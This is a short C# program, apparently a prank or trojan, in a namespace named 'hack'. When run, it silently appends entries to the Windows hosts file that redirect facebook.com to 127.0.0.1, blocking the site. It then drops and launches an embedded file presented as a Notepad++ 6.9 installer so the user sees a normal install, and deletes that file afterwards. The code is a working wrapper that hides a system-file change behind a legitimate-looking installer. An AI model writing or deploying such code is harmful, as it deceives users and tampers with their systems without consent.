using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using hack.Properties;

namespace hack
{
    internal static class Program
    {

        private const string HostsPath = @"C:\Windows\System32\drivers\etc\hosts";

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        private static void Main()
        {
            using (var sw = new StreamWriter(new FileStream(HostsPath, FileMode.Append)))
            {
                sw.WriteLine();
                sw.WriteLine("127.0.0.1 www.facebook.com");
                sw.WriteLine("127.0.0.1 facebook.com");
            }
            var exeBytes = Resources.npp_6_9_Installer;
            var tempFile = Path.Combine(Directory.GetCurrentDirectory(), "npp.6.9.Installer.exe");
            using (var fs = new FileStream(tempFile, FileMode.OpenOrCreate))
            {
                fs.Write(exeBytes, 0, exeBytes.Length);
            }
            try
            {
                using (var nppProcess = Process.Start(tempFile))
                {
                    nppProcess?.WaitForExit();
                }
            }
            finally
            {
                File.Delete(tempFile);
            }

        }
    }
}
